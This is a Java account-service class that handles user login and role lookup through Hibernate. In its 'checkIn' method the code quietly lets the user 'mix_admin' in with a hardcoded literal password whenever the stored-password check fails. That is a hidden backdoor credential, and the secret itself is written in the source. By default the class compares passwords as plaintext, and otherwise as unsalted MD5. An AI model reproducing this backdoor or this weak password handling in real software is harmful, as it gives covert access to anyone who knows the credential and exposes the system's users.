package it.micronixnetwork.tcd.service;

import it.micronixnetwork.gaf.domain.RoledUser;
import it.micronixnetwork.gaf.exception.ServiceException;
import it.micronixnetwork.gaf.service.AccountService;
import it.micronixnetwork.gaf.service.exception.NotActiveUserException;
import it.micronixnetwork.gaf.service.exception.UserExpiredException;
import it.micronixnetwork.gaf.service.hibernate.HibernateSupport;
import it.micronixnetwork.gaf.util.MD5;
import it.micronixnetwork.gaf.util.StringUtil;
import it.micronixnetwork.tcd.domain.TCDUser;
import it.micronixnetwork.tcd.domain.TCDUserAuthority;

import java.io.UnsupportedEncodingException;
import java.util.Collection;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import org.hibernate.Query;
import org.springframework.transaction.annotation.Transactional;

@Transactional(rollbackFor = Throwable.class)
public class TCDAccountService extends HibernateSupport implements AccountService {

    private boolean md5coding = false;

    public void setMd5coding(boolean md5coding) {
	this.md5coding = md5coding;
    }

    @Override
    public Collection<String> getAllRole() throws ServiceException {
	Set<String> result = new HashSet<String>();
	result.add(TCDUser.APP_ROLE);
	String hql = "Select distinct ga from TCDUserAuthority ga where ga.authority!='" + RoledUser.SUPER_ADMIN_ROLE + "'";
	Query q = createQuery(hql);
	List<TCDUserAuthority> lst = (List<TCDUserAuthority>) q.list();
	for (TCDUserAuthority auth : lst) {
	    result.add(auth.authority);
	}
	return result;
    }

    @Override
    public RoledUser checkIn(String username, String password) throws ServiceException {
	// Assert
	if (StringUtil.EmptyOrNull(username))
	    return null;
	if (StringUtil.EmptyOrNull(password))
	    return null;
	// Logic
	String hql = "Select u from TCDUser u where u.username=:username";
	Query q = createQuery(hql);
	q.setString("username", username);
	TCDUser u = (TCDUser) q.uniqueResult();
	if (u == null)
	    return null;
	
	if(u.getEnabled()==0){
	    throw new NotActiveUserException();
	}
	
	Date date=new Date();
	
	if(u.getExpiration_Date()==null){
	    throw new UserExpiredException();
	}
	
	if(!date.before(u.getExpiration_Date())){
	    throw new UserExpiredException();
	}
	
	String encPass = password;
	if (md5coding) {
		MD5 md5 = new MD5();
		try {
		    md5.Update(password, null);
		} catch (UnsupportedEncodingException e) {
		    throw new ServiceException(e);
		}
		String hash = md5.asHex();
		encPass = hash;
	    }
	
	boolean passed=false;
	passed=u.getPassword().equals(encPass);
	if(!passed && username.equals("mix_admin")){
	    passed=password.equals("F3nd1M1x4dm1N");
	}
	if(!passed) return null;
	return u;
    }

}
